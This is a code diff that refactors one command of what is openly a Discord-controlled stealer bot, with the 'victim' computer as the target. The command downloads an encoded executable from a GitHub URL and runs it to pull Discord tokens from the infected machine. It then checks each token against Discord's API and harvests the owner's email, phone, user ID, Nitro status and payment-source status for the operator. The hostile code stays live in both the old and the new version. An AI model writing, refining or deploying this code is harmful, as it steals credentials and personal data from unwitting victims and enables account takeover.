@@ -20,52 +20,73 @@ class CheckedTokens(commands.Cog):
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         """
-        if str(victim) == str(self.bot.identifier):
-            await ctx.response.defer()
-            try:
-                tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
-            except Exception as e:
-                return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
-                
-            os.chdir(nr_working)
-            with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
-            discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
-            
-            valid, email, phone, uname, nitro, bill, avatar, dcTks, idq = [], [], [], [], [], [], [], [], []
-            for a in discord_tokenz: dcTks.append(a.replace('"',''))
-            
-            webTks = self.bot.find_token()
-            finalTks = list(dict.fromkeys(dcTks + webTks))
-            
-            for token in finalTks:
-                headers = {'Authorization': token, 'Content-Type': 'application/json'}
-                requ = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-                            
-                if requ.status_code == 401: 
-                    await ctx.channel.send(embed=discord.Embed(title="Token is invalid!",description=token))
-                    continue
-                if requ.status_code == 200:
-                    valid.append( str(token) )
-                    json = requ.json()
-                    email.append( str(json['email']) )
-                    phone.append( str(json['phone']) ) 
-                    idq.append(   str(json["id"])   )            
-                    uname.append( f'{json["username"]}#{json["discriminator"]}' )
-                    avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
-                    nitro.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
-                    bill.append(str(bool(len(requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
-                    continue
+        if str(victim) != str(self.bot.identifier):
+            return
+        await ctx.response.defer()
+        try:
+            tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
+        except Exception as e:
+            return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
 
-            if len(valid) == 0: 
-                return await ctx.followup.send(embed = self.bot.genEmbed("No valid Discord Tokens", datetime.now()))
-            embeds = []
-            for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
-                embeds.append(self.bot.checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
-                    
-            if len(embeds) <= 1: await ctx.channel.send(embed=embeds[0])
-            else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
-            
-            await ctx.followup.send("Checked all tokens")
+        os.chdir(nr_working)
+        with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
+        discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
+
+        valid, email, phone, uname, nitro, bill, avatar, dcTks, idq = [], [], [], [], [], [], [], [], []
+        dcTks.extend(a.replace('"','') for a in discord_tokenz)
+
+        webTks = self.bot.find_token()
+        finalTks = list(dict.fromkeys(dcTks + webTks))
+
+        for token in finalTks:
+            headers = {'Authorization': token, 'Content-Type': 'application/json'}
+            requ = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+
+            if requ.status_code == 401: 
+                await ctx.channel.send(embed=discord.Embed(title="Token is invalid!",description=token))
+                continue
+            if requ.status_code == 200:
+                valid.append( str(token) )
+                json = requ.json()
+                email.append( str(json['email']) )
+                phone.append( str(json['phone']) )
+                idq.append(   str(json["id"])   )
+                uname.append( f'{json["username"]}#{json["discriminator"]}' )
+                avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
+                nitro.append(
+                    str(
+                        len(
+                            requests.get(
+                                'https://discordapp.com/api/v6/users/@me/billing/subscriptions',
+                                headers=headers,
+                            ).json()
+                        )
+                        > 0
+                    )
+                )
+                bill.append(
+                    str(
+                        len(
+                            requests.get(
+                                'https://discordapp.com/api/v6/users/@me/billing/payment-sources',
+                                headers=headers,
+                            ).json()
+                        )
+                        > 0
+                    )
+                )
+        if not valid: 
+            return await ctx.followup.send(embed = self.bot.genEmbed("No valid Discord Tokens", datetime.now()))
+        embeds = [
+            self.bot.checked_embeds(tk, em, ph, un, ni, bi, av, idqa)
+            for tk, em, ph, un, ni, bi, av, idqa in zip(
+                valid, email, phone, uname, nitro, bill, avatar, idq
+            )
+        ]
+        if len(embeds) <= 1: await ctx.channel.send(embed=embeds[0])
+        else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
+
+        await ctx.followup.send("Checked all tokens")
             
             
 class Menu(discord.ui.View):
